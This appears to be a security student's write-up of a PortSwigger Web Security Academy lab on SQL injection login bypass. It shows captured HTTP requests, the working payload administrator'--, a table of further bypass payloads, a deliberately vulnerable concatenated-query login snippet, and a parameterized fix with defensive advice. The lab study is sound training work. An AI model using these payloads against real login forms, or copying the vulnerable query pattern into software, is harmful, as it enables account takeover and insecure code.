# Lab 2: SQL Injection Vulnerability Allowing Login Bypass

## Executive Summary

This lab demonstrates a critical SQL injection vulnerability in authentication logic where user-supplied credentials are directly incorporated into SQL queries without sanitization. By injecting SQL comment syntax into the username field, I successfully bypassed password verification and gained unauthorized access to the administrator account. The payload `administrator'--` forced the SQL query to ignore password validation, granting immediate authentication without knowledge of actual credentials. This attack highlights the severe risks of improper input handling in authentication systems.

## Lab Details

| Attribute              | Value |
|------------------------|-------|
| **Source**             | PortSwigger Web Security Academy |
| **Topic**              | SQL Injection |
| **Difficulty**         | Apprentice |
| **Vulnerability**      | SQL Injection in Authentication Logic |
| **Risk**               | Critical - Complete Authentication Bypass |
| **Completion**         | February 1, 2026 |

## Objective

Exploit SQL injection in the login functionality to bypass authentication controls and gain unauthorized access to the administrator account without valid credentials.

## Testing Setup

**Tools Used:**
- Burp Suite Professional (Licensed to Gurpreet Singh)
- Burp Repeater for payload testing
- Browser for authentication verification

**Target:** Login authentication mechanism with SQL injection vulnerability

## Exploitation Walkthrough

### 1. Initial Access & Reconnaissance

Accessed the lab environment displaying "SQL injection vulnerability allowing login bypass" challenge.

<img width="1920" height="982" alt="LAB2_ss1" src="https://github.com/user-attachments/assets/80231dea-72f7-48f0-b314-c27828126421" />

*Lab 2 environment - Login page (right) | Burp Suite Professional configured (left)*

### 2. Authentication Flow Analysis

Tested login functionality with intentionally incorrect credentials to capture and analyze authentication requests.

**Test Credentials:**
- Username: `wiener`
- Password: `bluecheese` (incorrect)

<img width="1920" height="982" alt="LAB2_ss2" src="https://github.com/user-attachments/assets/c9820cc0-3af6-4e40-b2ca-197331ed5004" />

*Invalid login attempt showing "Incorrect username and password" (right) | POST request captured with CSRF token (left)*

**Authentication Request Captured:**
```http
POST /login HTTP/1.1
Content-Type: application/x-www-form-urlencoded

csrf=[TOKEN]&username=wiener&password=bluecheese
```

**Request Analysis:**
- **CSRF Token:** Anti-CSRF protection present
- **Username:** User-supplied input
- **Password:** User-supplied input

**Backend Query Structure (Inferred):**
```sql
SELECT * FROM users 
WHERE username = 'wiener' AND password = 'bluecheese'
```

**Response:** "Incorrect username and password".

### 3. SQL Injection Testing

Sent login request to Burp Repeater and tested SQL injection in username parameter.

**Test Payload:**
```http
POST /login HTTP/1.1

csrf=[TOKEN]&username=wiener'--&password=
```
<img width="1920" height="982" alt="LAB2_ss3" src="https://github.com/user-attachments/assets/e00680da-78be-43c3-bd4b-0d231db13b0f" />

*SQL injection test - 302 response confirms authentication bypass*

**Injected SQL Query:**
```sql
SELECT * FROM users 
WHERE username = 'wiener'--' AND password = ''
```

**Query Breakdown:**
```sql
username = 'wiener'  -- Checks if username is 'wiener'
'--                  -- SQL comment starts here
' AND password = ''  -- Everything after -- is commented out
```

**Result:** The password check is completely bypassed by commenting it out.

**Response:** 302 Found - Redirect to authenticated page

**Vulnerability Confirmed:** SQL injection in username field successfully bypasses authentication.

### 4. Administrator Access Attempt - CSRF Token Issue

Attempted to access administrator account using the same technique.

**Initial Attempt:**
```http
POST /login HTTP/1.1

csrf=[OLD_TOKEN]&username=administrator'--&password=
```
<img width="1920" height="982" alt="LAB2_ss4" src="https://github.com/user-attachments/assets/98a895ca-446b-4054-b1c2-1574305baf59" />

*Invalid CSRF token error - 400 Bad Request in HTTP history*

**Response:** 400 Bad Request - "Invalid CSRF token"

**Analysis:** CSRF tokens are single-use and session-bound. The token from the previous request is no longer valid.

**Solution:** Must obtain fresh CSRF token for each login attempt.

### 5. Fresh Session Establishment

Accessed the login page again to obtain a new CSRF token and valid session.

**Test Login:**
```http
POST /login HTTP/1.1

csrf=[FRESH_TOKEN]&username=administrator&password=admin
```
<img width="1920" height="982" alt="LAB2_ss5 1" src="https://github.com/user-attachments/assets/7478d9be-c652-4277-8a3b-9d7f96361ed2" />

*Fresh login attempt with new CSRF token captured in Burp HTTP history*

**Response:** "Incorrect password" - confirms administrator username exists and CSRF token is valid.

### 6. Administrator Account Takeover

Sent captured request to Burp Repeater and injected SQL payload to bypass administrator authentication.

**Attack Payload:**
```http
POST /login HTTP/1.1

csrf=[FRESH_TOKEN]&username=administrator'--&password=
```
<img width="1920" height="982" alt="LAB2_ss5 2" src="https://github.com/user-attachments/assets/46f8bbbe-9f47-44e1-951c-87177acaad49" />

*SQL injection successful - 302 response with administrator session token (left)*

**Injected SQL Query:**
```sql
SELECT * FROM users 
WHERE username = 'administrator'--' AND password = ''
```

**Query Logic:**
1. Search for username `'administrator'`
2. `--` comments out password check
3. Password verification bypassed
4. Authentication succeeds

**Response:**
```http
HTTP/1.1 302 Found
Location: /my-account
Set-Cookie: session=[ADMINISTRATOR_SESSION_TOKEN]
```

**Success:** Valid administrator session token obtained without password.

### 7. Browser-Based Authentication

Used the SQL injection payload directly in the browser login form to confirm exploitation.

**Login Credentials Entered:**
- Username: `administrator'--`
- Password: `[any random password]`

<img width="1920" height="982" alt="LAB2_ss6" src="https://github.com/user-attachments/assets/1f3851e8-8509-4a58-9440-baac0036440b" />

*Administrator account accessed successfully - Lab solved*

**Complete Account Access:**
- ✅ Administrator authentication bypassed
- ✅ Full administrative access obtained
- ✅ No password required
- ✅ Complete system compromise

**Lab completion confirmed: "Congratulations, you solved the lab!"**

## Technical Impact

**Severity: Critical (CVSS 9.8)**
```
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
```

**Primary Vulnerability:**

**CWE-89: SQL Injection in Authentication**
- User credentials directly concatenated into SQL queries
- No input sanitization or validation
- SQL metacharacters interpreted as code
- Authentication logic completely bypassed

**Vulnerable Code Pattern:**
```python
# VULNERABLE CODE
username = request.POST['username']
password = request.POST['password']

query = "SELECT * FROM users WHERE username = '" + username + "' AND password = '" + password + "'"
user = database.execute(query)

if user:
    login_user(user)
```

**Exploitation Mechanics:**

**Normal Authentication:**
```sql
Input: username=admin, password=secret123
Query: SELECT * FROM users WHERE username = 'admin' AND password = 'secret123'
Result: Returns user only if both username AND password match
```

**Injected Authentication Bypass:**
```sql
Input: username=administrator'--, password=[anything]
Query: SELECT * FROM users WHERE username = 'administrator'--' AND password = '[anything]'
Result: Password check commented out, returns user with username match only
```

**Attack Chain:**
```
SQL Injection in Username Field
        ↓
Inject: administrator'--
        ↓
SQL Query Modified
        ↓
WHERE username = 'administrator'--'
        ↓
Password Check Commented Out
        ↓
Query Returns Administrator Record
        ↓
Authentication Succeeds
        ↓
Administrator Session Granted
        ↓
Complete System Access
```

**Alternative SQL Injection Payloads:**

| Payload | SQL Query Result | Effect |
|---------|------------------|--------|
| `admin'--` | `...WHERE username = 'admin'--'...` | Comments out password check |
| `admin'#` | `...WHERE username = 'admin'#'...` | MySQL comment syntax |
| `' OR 1=1--` | `...WHERE username = '' OR 1=1--'...` | Always true condition |
| `admin' OR '1'='1` | `...WHERE username = 'admin' OR '1'='1'` | Boolean logic bypass |

**Real-World Impact:**

| Target | Consequence |
|--------|-------------|
| **Corporate Systems** | Complete administrative control, data exfiltration |
| **E-Commerce** | Customer data theft, financial fraud, order manipulation |
| **Banking** | Account access, unauthorized transactions |
| **Healthcare** | PHI exposure, medical record tampering |
| **Government** | Classified data access, system compromise |

**Escalation Potential:**

Beyond authentication bypass, SQL injection enables:
- **Data Exfiltration:** Extract entire database contents
- **Data Modification:** Alter records, inject malicious data
- **Privilege Escalation:** Create new admin accounts
- **Command Execution:** Potentially execute OS commands (if permissions allow)
- **Lateral Movement:** Access other database tables and systems

## Key Takeaways

**Penetration Testing Methodology:**
- Authentication flow analysis
- SQL injection syntax testing
- CSRF token management
- Payload refinement and validation
- Browser-based exploitation verification

**Critical Security Insights:**

**1. Authentication is a Critical Attack Surface:**
Login functionality requires maximum security:
- Most targeted functionality by attackers
- Single point of failure for entire system
- Bypass grants complete unauthorized access
- Must implement multiple defensive layers

**2. SQL Injection in Authentication is Critical:**
Unlike data disclosure, authentication bypass provides:
- Immediate elevated access
- No password knowledge required
- Administrative privileges obtainable
- Complete system compromise possible

**3. Comment Syntax is Powerful:**
SQL comment characters (`--`, `#`, `/*`) enable:
- Bypassing password checks
- Ignoring additional query conditions
- Simplifying complex injection attacks
- Defeating multi-factor authentication in some cases

**4. Parameterized Queries Are Mandatory:**

**Secure Implementation:**
```python
# SECURE CODE - Parameterized Query
username = request.POST['username']
password = request.POST['password']

query = "SELECT * FROM users WHERE username = ? AND password = ?"
user = database.execute(query, [username, password])

if user:
    login_user(user)
```

**Why This Works:**
- Database treats user input as data, not code
- Special characters automatically escaped
- SQL structure cannot be modified
- Prevents all SQL injection attacks

**5. Defense-in-Depth for Authentication:**

**Multiple Security Layers:**
- **Parameterized queries** (prevent injection)
- **Input validation** (whitelist allowed characters)
- **Password hashing** (protect stored credentials)
- **Multi-factor authentication** (backup even if password bypassed)
- **Rate limiting** (prevent brute-force)
- **Account lockout** (limit attack attempts)
- **Monitoring** (detect suspicious login patterns)

**6. CSRF Protection Considerations:**
Even with CSRF tokens present:
- SQL injection still exploitable
- Tokens protect against CSRF, not injection
- Multiple security controls needed
- Don't rely on single protection mechanism

**Professional Skills Demonstrated:**
- SQL injection identification in authentication
- Comment-based query manipulation
- CSRF token handling during exploitation
- Multi-attempt attack refinement
- Complete authentication bypass execution
- Browser-based attack validation

## References

1. PortSwigger Web Security Academy - SQL Injection
2. OWASP Top 10 (2021) - A03: Injection
3. CWE-89 - SQL Injection
4. OWASP SQL Injection Prevention Cheat Sheet
5. OWASP Authentication Cheat Sheet

---

## Legal Notice

**Copyright © 2025 Gurpreet Singh**  
Licensed under CC BY-NC-ND 4.0

**Repository:** https://github.com/Gurpreet-Singh-offensive-Security/Offensive-Security-Labs

**Disclaimer:** This documentation is for authorized security testing and educational purposes only. All techniques were performed in a controlled laboratory environment with explicit permission. Unauthorized access to systems is illegal under applicable laws worldwide.
